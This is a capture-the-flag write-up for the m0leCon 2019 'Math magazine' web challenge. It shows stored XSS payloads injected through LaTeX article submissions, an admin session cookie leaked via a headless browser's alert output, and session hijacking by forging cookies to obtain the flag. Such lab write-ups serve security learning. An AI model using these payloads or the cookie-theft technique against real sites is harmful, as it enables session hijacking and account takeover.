# m0leCon CTF 2019 – Math magazine

* **Category:** web
* **Points:** 55

## Challenge

> Do you like math? Click here.
>
> Author: @andreossido
>
> http://10.255.0.1:8011/

## Solution

Connecting to the website you can see the following message.

```
Welcome!

This site is a math articles container.
At the moment you can only read your articles and write new ones.
Only admin can read other account articles, so pay attention what do you write :)
```

This website allows you to upload LaTeX documents and to list and view your uploaded ones. The view functionality doesn't escape/encode the output and the text field where you can write your LaTeX script doesn't sanitize the input; as a consequence, the website is vulnerable to XSS.

```latex
\documentclass{article}
\begin{document}

<script>alert();</script>

\end{document}
```

You can abuse this, in order to print administrator cookies, with the following payload.

```latex
\documentclass{article}
\begin{document}

<script>alert(document.cookie);</script>

\end{document}
```

When the article is submitted, the following output is shown.

```
WARN: Published, but admin cannot view you article :(
Error:
[*] Going to visit url: http://10.255.0.1:8011/?p=articles&a=view&u_id=f2c41083389d45ee757cc8f65eb2afd4&id=11
[*] Getting FLAG...

Alert Text: None
Message: unexpected alert open: {Alert text : PHPSESSID=aec0e26f10db41a5b584483bdc67dab1; FLAG=ptm{the_flag_is_not_here}}
(Session info: headless chrome=75.0.3770.100)
```

But the flag is not the real one.

Analyzing the HTML, you can discover the following interesting comment.

```html
<!--
    <li class="nav-item">
        (Not used anymore, but I left it here for historical reasons)
        <a class="nav-link" href="./src.zip">Source</a>
    </li>
-->
```

So you can download the [src.zip](src.zip) file.

Analyzing the [list](./src/pages/articles.actions/list) source code, you can discover an interesting `if` statement, where the real flag is set into a cookie.

```php
<?php
	if(isset($_COOKIE['FLAG']) && $_COOKIE['FLAG'] === FALSE_FLAG && $_SESSION['SECRET'] === SECRET){
		setCookie('FLAG', FLAG, time() + 100, '/');
	}

	$f = new ArticleFactory(USER);
?>
```

At this point you have already leaked the `FALSE_FLAG`, so you can force it into a cookie. You don't have `SECRET` value into your session, but you have the `PHPSESSID` of the administrator, so you can steal its session changing your cookie.

Crafting both cookies accordingly and accessing to the `list` functionality will give you the flag into the `FLAG` cookie.

```
ptm{L4t3x_1nj3ct10n_1s_c00l}
```

**Note**: According to the challenge creator, the technique to leak `PHPSESSID` and false `FLAG` was not the *intended* one.